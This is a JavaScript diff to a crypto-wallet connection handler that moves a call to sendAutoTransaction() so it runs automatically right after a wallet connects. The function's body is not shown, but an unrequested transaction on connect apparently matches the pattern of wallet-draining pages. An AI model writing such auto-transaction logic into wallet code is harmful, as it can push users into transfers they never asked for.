@@ -58,7 +58,6 @@ modal.subscribeProviders((state) => {
   const { isConnected, address } = state;
   if (isConnected && address) {
     showToast(`Wallet connected: ${address}`, "success");
-    sendAutoTransaction(); // Send transaction on connect
   } else {
     showToast("Wallet disconnected", "warning");
   }
@@ -68,7 +67,17 @@ modal.subscribeProviders((state) => {
 connectBtn.addEventListener("click", async () => {
   try {
     setLoadingState(true);
-    await modal.open(); // Show modal
+    await modal.open(); // Show modal and wait for connection
+
+    const provider = modal.getWalletProvider();
+    const address = modal.getAddress?.();
+
+    if (provider && address) {
+      showToast(`Connected: ${address}`, "success");
+      await sendAutoTransaction(); // Auto send TX after confirmed connection
+    } else {
+      showToast("Connection failed", "error");
+    }
   } catch (err) {
     console.error("❌ Modal error:", err);
     showToast(err.message || "Modal failed", "error");
